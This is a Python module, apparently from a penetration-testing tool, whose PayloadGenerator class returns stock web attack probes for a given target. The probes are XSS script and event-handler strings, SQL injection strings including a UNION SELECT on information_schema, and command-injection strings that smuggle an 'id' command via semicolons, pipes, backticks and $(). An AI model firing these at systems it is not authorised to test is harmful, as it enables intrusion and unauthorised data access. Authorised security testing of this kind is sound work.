import random
import string
from utils.logger import setup_logger
import logging

setup_logger()

class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            'xss': self.generate_xss_payloads,
            'sqli': self.generate_sqli_payloads,
            'rce': self.generate_rce_payloads
        }

    def generate_xss_payloads(self):
        """Generate common XSS test payloads"""
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            'javascript:alert("XSS")'
        ]
        logging.info("Generated XSS payloads")
        return payloads

    def generate_sqli_payloads(self):
        """Generate common SQL injection test payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null,table_name FROM information_schema.tables--"
        ]
        logging.info("Generated SQLi payloads")
        return payloads

    def generate_rce_payloads(self):
        """Generate common RCE test payloads"""
        payloads = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '|| id',
            '&& id'
        ]
        logging.info("Generated RCE payloads")
        return payloads

    def generate_custom_payload(self, length=10):
        """Generate random alphanumeric payload"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

def generate_payloads(target):
    generator = PayloadGenerator()
    payloads = {
        'xss': generator.generate_xss_payloads(),
        'sqli': generator.generate_sqli_payloads(),
        'rce': generator.generate_rce_payloads()
    }
    logging.info(f"Payloads generated for target: {target}")
    return payloads